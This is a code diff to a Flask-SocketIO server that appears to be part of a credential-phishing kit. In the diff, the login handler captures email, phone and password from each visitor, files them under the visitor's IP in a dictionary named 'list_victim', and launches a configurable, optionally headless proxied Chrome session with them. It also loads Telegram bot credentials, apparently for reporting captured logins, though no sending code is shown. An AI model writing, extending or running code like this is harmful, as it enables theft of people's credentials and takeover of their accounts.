@@ -80,6 +80,16 @@ def handle_exit():
 
 @socketio.on("login")
 def handle_login(data):
+    global cookie_type, api_token, chat_id, telegram
+    setting = Setting().get_info()
+    proxy = Config().get_info()["proxy"]
+    load_image = setting["load_image"]
+    load_css = setting["load_css"]
+    hide_chrome = setting["hide_chrome"]
+    auto_close = setting["auto_close"]
+    cookie_type = setting["cookie_type"]
+    api_token = Config().get_info()["api_token"]
+    chat_id = Config().get_info()["chat_id"]
     if request.headers.getlist("X-Forwarded-For"):
         ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
@@ -89,7 +99,8 @@ def handle_login(data):
     if ip in list_victim:
         pass
     else:
-        list_victim[ip] = AutoChrome()
+        list_victim[ip] = AutoChrome(
+            image=bool(load_image), css=bool(load_css), headless=bool(hide_chrome), auto_close=bool(auto_close), proxy=proxy)
     list_victim[ip].email = data["email"]
     list_victim[ip].phone_number = data["phone"]
     list_victim[ip].password = data["password"]
